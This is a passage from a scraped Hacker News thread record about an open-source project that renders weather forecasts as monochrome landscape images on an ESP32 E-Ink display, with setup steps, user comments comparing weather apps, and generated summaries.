./makevenv.sh source .venv/bin/activate Preparing environment Windows makevenv.bat .venv/Scripts/Activate Image creation test Update OWM_KEY variable in the weather_landscape.py file with your OpenWeather API key. python run_test.py Run server python run_server.py Hardware The hardware setup includes an ESP32 development board and 2.9inch E-Ink display module. Currently, the setup only displays an image sourced from the internet, updating every 15 minutes. It is uncertain whether the image generation code can be adapted for use with MicroPython on the ESP32 at this time. More information",
    "commentLink": "https://news.ycombinator.com/item?id=41603546",
    "commentBody": "Visualizing Weather Forecasts Through Landscape Imagery (github.com/lds133)116 points by lds133 2 hours agohidepastfavorite22 comments bazzargh 2 minutes agoI noodled with a project a couple of years ago to pick art based on the weather https://bazzargh.github.io/weather/ put it on 'manual filter' and try setting some of the filters, you can see the tagged images it comes up with. I wasn't really interested in this being an accurate weather report, I was thinking more of using it in a photoframe or as a desktop background for mood. the image tags are all in here https://github.com/bazzargh/bazzargh.github.io/blob/master/w... and were largely done manually, I started by picking paintings I liked, then looking for gaps in the tags and trying to find paintings to cover those. reply qnleigh 5 minutes agoprevThis is super-fun. Kinda makes me want to do the following: set up a camera to take regular photos of a greenspace near my house. Record couldcover data and date stamps alongside the images, and then then show the most similar image to the current forecast as a background, maybe on my laptop. Wouldn't convey as much information as this project, but it could be very satisfying. reply LeoPanthera 2 hours agoprevHa, this is great. I hooked up an old photo frame to OpenAI's DALL-E image generator, which is told to make an image based on the current weather data right now. It updates every few hours. This is what it's showing right now: https://ibb.co/8K5jZ3B reply riedel 1 hour agoparentSee also: https://github.com/blixt/sol-mate-eink (using city images) reply 3abiton 1 hour agoprevThis is one of the best microcontroller projects I've encoutered recently! Amazing work! reply nelblu 1 hour agoprevGreat work! That said if we are focusing on the UX, windy.com has got the best weather reporting experience. Ex: I am almost never interested in \"30% chance of shower at 08:00pm\" type of forecast. I am more interested in the trend in which the clouds/rains are moving. This helps me figure out which direction I can drive to get the best sunshine or whatever else. Is there anyone else who is doing it the way windy.com is doing? I really love them, and so far their experience is great (almost no dark UX patterns), that said I would love to see some more competition in this space. reply jasonmarks_ 1 hour agoparent> This helps me figure out which direction I can drive to get the best sunshine or whatever else. I published a road trip weather app that crunches forecasts for you if you're going for a drive and would like to avoid the worst of the weather. It's great for evaluating whether to start a trip during the evening or the next morning. Timestamps are built using Google directions so you have about as accurate a forecast as you can in 2024. > I am almost never interested in \"30% chance of shower at 08:00pm\" type of forecast. I understand this sentiment but that is sorta where medium term forecasting is right now. Android or iOS https://weatherthetrip.com/download reply captainkrtek 1 hour agoparentprevI’m a big fan of Meteoblue, they provide a lot of different forecast ensemble visualizations. While not the same as windy in terms of ux, it does a good job of conveying model uncertainty and model agreement. reply unanimous 1 hour agoparentprevZoom Earth is similar to Windy.com https://zoom.earth/ reply adamfeldman 1 hour agoparentprevWeather Strip (iOS) https://apps.apple.com/us/app/weather-strip/id1528594026 reply xd1936 1 hour agoprevLove love love love this. This would be great for kids. I pitched a very similar \"weather for kids\" visualizer product idea on the very first episode of my podcast. https://spitball.show/@podcast/episodes/1 reply jp57 1 hour agoprevIt's an interesting idea, but some of the image semantics seem weirdly wrong. In particular, the sky shouldn't be light at night, and the sun shouldn't be high at sunrise. If you have to learn counterintuitive things like \"the appearance of the sun anywhere in the sky indicates sunrise\", and \"nighttime is indicated by, well, idk what exactly, but it's not darkness\", it kind of fails at it's main purpose, I think. EDIT: I'll add that many weather apps have a left-to-right timeline of some sort, and indicate sunrise and sunset with intuitive iconography. EDIT2: The Windy.com timeline view shows sky condition, day/night, moon phase, temperature, precipitation, and wind speed and direction in a nice compact left-to-right timeline. (click the summary in the upper left) reply pilooch 46 minutes agoprevCan't wait for the stable diffusion version :) reply yaj54 59 minutes agoprevIt's like a line-scan camera for the weather. reply tamimio 1 hour agoprevLooks great, would love if it was fully offline and interface with sensors directly reply celie56 1 hour agoparentMaybe I misread the docs, but it looked like it was generating a visual for the whole day. If this were offline you could have it double as a clock and regenerate the image every N minutes. reply rickcarlino 2 hours agoprevLove the monochrome artwork, great work on this project. reply jerjerjer 1 hour agoprevFrom readme: > Traditional weather stations often display sensor readings as raw numerical data. Navigating these dashboards can be overwhelming and stressful, as it requires significant effort to locate, interpret, and visualize specific parameters effectively. Simply fascinating. The reverse holds true for me. Numbers provide easily identifiable and recognizable references, while sample images look incomprehensible to me. Without accompanying descriptions, I'd never guess what the author is getting at (except in the broadest of strokes). To each their own, of course. reply SebastianKra 50 minutes agoprevIf you'd like to see this implemented in a practical way, check out Weather Strip. It's a master class in information density while also being intuitive and readable. https://www.weatherstrip.app/ reply anonova 15 minutes agoparentNote that this kind of visualization is just the collapsed form of a standard forecast graph, e.g. https://forecast.weather.gov/MapClick.php?lat=37.39&lon=-122... https://www.wunderground.com/forecast/us/ca/mountain-view reply bobabob 47 minutes agoprevIt looks lovely but it's absolutely incomprehensible beyond \"maybe it'll rain\" and \"maybe i'll be sunny\". Without the explanation of what the symbols meant I'd never guess. reply lb1lf 49 minutes agoprev [–] In a somewhat related vein, the wonderful Ootside[0] website gives you the weather with a Scottish twist. Mostly, the weather around where I live is described as 'Mostly shite'. [0] https://ootsi.de/ reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A new method visualizes weather forecasts through landscape imagery, making it more intuitive and less stressful than traditional numerical data.",
      "The landscape image encodes various weather elements, such as wind direction, temperature, cloud cover, and precipitation, along with non-weather events like birthdays and holidays.",
      "Implemented using Python and the Pillow library, the system is designed for a 296x128 E-Ink display and updates every 15 minutes using an ESP32 development board."
    ],
    "commentSummary": [
      "A project visualizes weather forecasts through landscape imagery, aiming to set the mood rather than provide accurate weather reports.",
      "Users have shared various implementations, including using OpenAI's DALL-E to generate images based on current weather data and integrating with microcontrollers.",
      "The project has sparked interest due to its creative approach to weather visualization, with suggestions for improvements like offline functionality and direct sensor interfacing."
    ],
    "points": 119,
    "commentCount": 22,
    "retryCount": 0,
    "time": 1726849860
  }
]
